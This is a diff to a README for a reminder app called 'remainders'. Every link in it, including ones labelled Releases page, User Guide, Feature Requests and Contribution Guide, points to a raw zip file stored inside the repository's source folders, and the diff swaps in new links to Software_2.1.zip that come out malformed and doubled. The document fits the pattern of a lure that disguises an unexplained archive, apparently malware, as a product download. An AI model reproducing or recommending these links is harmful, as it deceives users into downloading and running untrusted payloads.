@@ -1,6 +1,6 @@
 # 🌟 remainders - Your Daily Reminder to Live Intentionally
 
-[![Download Remainders](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/api/[username]/Software_archbishopess.zip)](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/api/[username]/Software_archbishopess.zip)
+[![Download Remainders](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip[username]https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip)](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip[username]https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip)
 
 ## 📦 Overview
 
@@ -17,7 +17,7 @@
 
 Follow these steps to download and run the **remainders** application:
 
-1. **Visit the Download Page:** [Click here to go to the Releases page.](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/api/[username]/Software_archbishopess.zip)
+1. **Visit the Download Page:** [Click here to go to the Releases page.](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip[username]https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip)
    
    You will find all the available versions of the application. Select the latest release for the best performance and features.
 
@@ -48,7 +48,7 @@ Ensure your device meets the following minimum system requirements before downlo
 
 ## 📥 Download & Install
 
-To access the application, visit the [Releases page](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/api/[username]/Software_archbishopess.zip) and follow the steps outlined above. 
+To access the application, visit the [Releases page](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip[username]https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip) and follow the steps outlined above. 
 
 ### 🖥️ Troubleshooting Installation
 
@@ -93,8 +93,8 @@ Join our community of users to share tips and ask questions. Whether you need as
 
 ## 📖 Additional Resources
 
-- [User Guide](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/api/[username]/Software_archbishopess.zip)
-- [Feature Requests](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/api/[username]/Software_archbishopess.zip)
-- [Contribution Guide](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/api/[username]/Software_archbishopess.zip)
+- [User Guide](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip[username]https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip)
+- [Feature Requests](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip[username]https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip)
+- [Contribution Guide](https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip[username]https://github.com/BARNEY020903/remainders/raw/refs/heads/main/app/plugins/Software_2.1.zip)
 
 Thank you for choosing **remainders**. We hope it helps you live a more intentional life.
